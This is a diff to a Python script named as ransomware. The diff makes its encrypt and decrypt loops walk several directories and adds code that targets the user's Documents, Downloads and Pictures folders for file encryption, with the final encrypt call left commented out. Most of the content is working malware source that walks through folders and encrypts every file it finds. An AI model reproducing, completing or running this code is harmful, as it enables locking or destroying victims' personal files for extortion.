@@ -29,8 +29,9 @@ class bcolors:
 
 os.system("color")
 
+#===========================#
+
 keyfilePath = "key.txt"
-dirToEncrypt = ""
 
 #===========================#
 
@@ -73,6 +74,8 @@ def decrypt(input_file):
     except Exception as e:
         print(f"An error occurred: {e}")
 
+#===========================#
+
 def encrypt(input_file):
     try:
         key = read_key()
@@ -94,21 +97,29 @@ def walk_files(directory):
 
 #===========================#
 
-def ransomware():
+def ransomware(dirsToEncrypt):
 
-    for file_path in walk_files(dirToEncrypt):
-        # DON'T ENCRYPT THE KEY FILE OR THIS PIECE OF CODE!
-        if file_path != keyfilePath and ".py" not in file_path and "key.txt" not in file_path:
-            encrypt(file_path)
-            print(f"-> [{bcolors.FAIL}Encrypted{bcolors.ENDC}] [{bcolors.ORANGE}"+file_path+f"{bcolors.ENDC}]")
+    for dirToEncrypt in dirsToEncrypt:
 
-def deransomware():
+        for file_path in walk_files(dirToEncrypt):
+        
+            # DON'T ENCRYPT THE KEY FILE OR THIS PIECE OF CODE!
+            if file_path != keyfilePath and ".py" not in file_path and "key.txt" not in file_path:
+                encrypt(file_path)
+                print(f"-> [{bcolors.FAIL}Encrypted{bcolors.ENDC}] [{bcolors.ORANGE}"+file_path+f"{bcolors.ENDC}]")
 
-    for file_path in walk_files(dirToEncrypt):
-        # DON'T DECRYPT THE KEY FILE OR THIS PIECE OF CODE!
-        if file_path != keyfilePath and ".py" not in file_path and "key.txt" not in file_path:
-            decrypt(file_path)
-            print(f"-> [{bcolors.OKGREEN}Decrypted{bcolors.ENDC}] [{bcolors.OKCYAN}"+file_path+f"{bcolors.ENDC}]")
+#===========================#
+
+def deransomware(dirsToEncrypt):
+
+    for dirToEncrypt in dirsToEncrypt:
+
+        for file_path in walk_files(dirToEncrypt):
+        
+            # DON'T DECRYPT THE KEY FILE OR THIS PIECE OF CODE!
+            if file_path != keyfilePath and ".py" not in file_path and "key.txt" not in file_path:
+                decrypt(file_path)
+                print(f"-> [{bcolors.OKGREEN}Decrypted{bcolors.ENDC}] [{bcolors.OKCYAN}"+file_path+f"{bcolors.ENDC}]")
 
 #===========================#
 
@@ -117,5 +128,16 @@ if __name__ == '__main__':
     # Generate an encryption key.
     generate_key()
     
+    # Generate file paths for this user.
+    documentsFolder = os.path.join(os.path.expanduser('~'), 'Documents')
+    downloadsFolder = os.path.join(os.path.expanduser('~'), 'Downloads')
+    picturesFolder = os.path.join(os.path.expanduser('~'), 'Pictures')
+    
+    commonDirectories = [
+        documentsFolder,
+        downloadsFolder,
+        picturesFolder,
+    ]
+    
     # Encrypt everything!
-    ransomware()
+    # ransomware(commonDirectories)
